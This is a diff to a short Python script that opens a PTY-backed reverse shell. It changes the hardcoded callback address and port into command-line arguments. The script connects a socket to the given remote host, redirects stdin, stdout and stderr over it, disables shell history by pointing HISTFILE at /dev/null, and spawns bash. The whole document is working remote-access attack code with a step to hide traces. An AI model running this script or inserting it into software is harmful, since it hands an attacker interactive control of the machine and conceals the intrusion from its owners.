@@ -12,20 +12,24 @@ Or use the included tcp_pty_shell_handler.py
 """
 import os
 import pty
+import sys
 import socket
 
-lhost = "127.0.0.1" # XXX: CHANGEME
-lport = 31337 # XXX: CHANGEME
-
 def main():
+    if len(sys.argv) < 3:
+      print("Usage:\n  " + sys.argv[0] + " <ip> <port>\n")
+      exit(1)
+
+    rhost = str(sys.argv[1])
+    rport = int(sys.argv[2])
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((lhost, lport))
+    s.connect((rhost, rport))
     os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
     os.putenv("HISTFILE",'/dev/null')
     pty.spawn("/bin/bash")
     s.close()
-	
+
 if __name__ == "__main__":
     main()
